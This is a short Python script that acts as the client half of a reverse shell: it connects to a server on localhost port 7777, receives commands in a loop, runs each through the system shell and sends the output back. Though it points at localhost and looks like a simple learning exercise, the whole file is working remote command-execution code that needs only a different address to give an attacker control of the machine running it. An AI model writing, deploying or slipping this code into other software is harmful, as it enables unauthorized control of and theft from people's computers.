import socket
import subprocess

client = socket.socket()

try:
    client.connect(('localhost', 7777))
    client.sendall('1'.encode('utf-8')) # Handshake

    while True:
        command = client.recv(1024).decode('utf-8')
        print(f'Received command -> $ {command}')
        cmd_output = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        error = cmd_output.stderr.read().decode('utf-8')
        if error != '':
            client.sendall(f'Command error -> $ {error}'.encode('utf-8'))
        else:
            client.sendall(cmd_output.stdout.read())
except Exception as e:
    print(e)